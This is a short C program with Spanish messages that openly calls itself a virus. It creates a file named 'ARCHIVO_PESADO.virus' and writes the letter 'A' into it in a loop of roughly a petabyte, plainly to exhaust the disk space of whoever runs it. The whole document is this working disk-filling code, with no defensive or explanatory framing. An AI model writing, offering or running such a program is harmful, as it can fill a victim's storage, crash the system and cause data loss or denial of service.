
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
  
  char caracter = 'A';
  unsigned long long i;
  unsigned long long max = (unsigned long long)  1024 * 1024 * 1024 * 1024 * 1024;
  FILE *archivo;
  
  fopen_s(&archivo, "ARCHIVO_PESADO.virus", "wb");
  
  if(archivo == NULL){
    printf("Error no se pudo crear el archivo\n");
    exit(1);
  }
  
  for(i = 0; i < max; i++){
    putc(caracter, archivo);
  }
  
  fclose(archivo);
  system("pause");
}